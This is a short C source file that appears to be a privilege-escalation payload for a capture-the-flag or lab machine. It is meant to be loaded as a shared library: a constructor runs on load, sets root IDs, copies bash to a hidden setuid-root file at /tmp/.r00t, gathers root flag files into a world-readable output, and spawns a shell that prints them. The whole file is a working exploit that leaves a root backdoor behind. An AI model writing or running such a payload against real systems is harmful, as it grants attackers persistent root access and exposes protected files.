#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
	setuid(0); seteuid(0); setgid(0); setegid(0);
	/* Make a root shell available and dump flag files */
	system("cp /bin/bash /tmp/.r00t 2>/dev/null; chmod 4755 /tmp/.r00t 2>/dev/null; "
	       "rm -f /tmp/flag_out; "
	       "for f in /root/root.txt /root/flag.txt /flag /flag.txt /root/.flag /root/flag /home/root/root.txt; do "
	       "  if [ -f \"$f\" ]; then echo \"== $f ==\" >> /tmp/flag_out; cat \"$f\" >> /tmp/flag_out 2>&1; fi; "
	       "done; "
	       "id >> /tmp/flag_out 2>&1; chmod 666 /tmp/flag_out 2>/dev/null");
	execl("/bin/sh","sh","-c","id; echo '--- flag ---'; cat /tmp/flag_out 2>/dev/null",NULL);
}
